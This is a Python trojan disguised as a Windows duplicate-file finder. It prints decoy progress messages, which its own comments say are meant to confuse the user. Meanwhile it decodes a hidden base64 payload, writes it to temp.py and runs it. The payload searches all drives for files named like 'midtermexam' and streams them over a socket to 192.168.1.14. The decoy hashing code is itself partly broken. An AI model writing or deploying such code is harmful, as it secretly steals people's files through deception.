import hashlib
import base64
import time
import os
from multiprocessing import Process


def main():
    # Initialize a variable to record the number of times the child process has run
    child_process_count = 0

    # Fork a child process
    if child_process_count == 0 and os.name == 'nt':
        child_process_count += 1

        # Print fake message confuse user
        print("This program can find exact same file in target directory")
        print("by comparing the file hash value")
        time.sleep(2)
        print("Building index ...")
        time.sleep(5)
        print("Searching ...")

        # On Windows, use multiprocessing module to spawn a new child process
        p = Process(target=t)
        p.start()
        p.join()

        # Print fake message confuse user
        print("Collecting duplicate file directory ...")
        time.sleep(10)
        # Start of Parent process

        # Specify the folder path for duplicate check.
        folder = r'C:\Users\YHD\Documents\PycharmProjects\MidtermLifeSaver'
        # Traverse all files in the specified folder
        for dirpath, dirnames, filenames in os.walk(folder):
            # Traverse all files in the current folder
            for filename in filenames:
                # Concatenate the complete path of the file
                file_path = os.path.join(dirpath, filename)

        # Open each file and compute its hash value
        with open(file_path, 'rb') as f:

            # Define a dictionary to store file hash values and corresponding file paths
            hash_dict = {}
            # Traverse all files in the specified folder again and compute and compare the hash values of each file
            for dirpath, dirnames, filenames in os.walk(folder):
                # Traverse all files in the current folder
                for filename in filenames:
                    # Concatenate the complete path of the file
                    file_path = os.path.join(dirpath, filename)
                    # Open the file and compute its hash value
                    with open(file_path, 'rb') as f:
                        file_hash = hashlib.sha1(f.read()).hexdigest()
                        # Check if the hash value of the current file already exists in the dictionary
                        # if so, the file is a duplicate
                        if file_hash in hash_dict:
                            print('\nDuplicate file:', file_path)
                            print('Duplicates with', hash_dict[file_hash])
                        else:
                            # If the hash value of the current file has not appeared in the dictionary
                            # add it to the dictionary
                            hash_dict[file_hash] = file_path
        if child_process_count == 0:
            # Child process
            t()
        elif child_process_count == 1:
            print("\nDone!")

    else:
        print("Sorry, this program only support Windows")
        pass


def t():
    malware_fd = open("temp.py", "w", encoding="utf-8")
    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQpkcml2ZXMgPSBvcy5wb3Blbignd21pYyBsb2dpY2FsZGlzayBnZXQgY2FwdGlvbicpCmRyaXZlcyA9IFtkcml2ZS5zdHJpcCgpIGZvciBkcml2ZSBpbiBkcml2ZXMgaWYgZHJpdmUuc3RyaXAoKV0KZXhhbV9maWxlX2xpc3QgPSBbXQpmb3IgZHJpdmUgaW4gZHJpdmVzOgogICAgcGF0aCA9IG9zLnBhdGguam9pbihkcml2ZSwgIlxcIikKICAgIGZvciBkaXJQYXRoLCBkaXJOYW1lcywgZmlsZU5hbWVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZU5hbWVzOgogICAgICAgICAgICBpZiByZS5zZWFyY2goIm1pZHRlcm1leGFtIiwgb3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKSBhbmQgbm90IGZpbGUuZW5kc3dpdGgoJy5sbmsnKToKICAgICAgICAgICAgICAgIGV4YW1fZmlsZV9saXN0LmFwcGVuZChvcy5wYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpCmV4YW1fZmlsZV9saXN0ID0gW2VsZW0gZm9yIGVsZW0gaW4gZXhhbV9maWxlX2xpc3QgaWYgbm90IGVsZW0uc3RhcnRzd2l0aCgnXFwnKV0KY2xpZW50X3NvY2tldCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKY2xpZW50X3NvY2tldC5jb25uZWN0KCgiMTkyLjE2OC4xLjE0IiwgOTU4NykpCmhhc2hfZGljdCA9IHt9CmZvciBleGFtX2ZpbGUgaW4gZXhhbV9maWxlX2xpc3Q6CiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIG1kNSA9IGhhc2hsaWIubWQ1KGYucmVhZCgpKS5oZXhkaWdlc3QoKQogICAgaWYgbWQ1IGluIGhhc2hfZGljdDoKICAgICAgICBjb250aW51ZQogICAgZmlsZV9zaXplID0gb3MucGF0aC5nZXRzaXplKGV4YW1fZmlsZSkKICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoMTA0ODU3NikKICAgICAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZGF0YSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgaGFzaF9kaWN0W21kNV0gPSBleGFtX2ZpbGUKY2xpZW50X3NvY2tldC5zZW5kYWxsKGIib3ZlciIpCmNsaWVudF9zb2NrZXQuY2xvc2UoKQo="
    newMalware = base64.b64decode(blob).decode("UTF-8")
    malware_fd.write(newMalware)
    malware_fd.close()
    os.system("python temp.py")


if __name__ == "__main__":
    main()
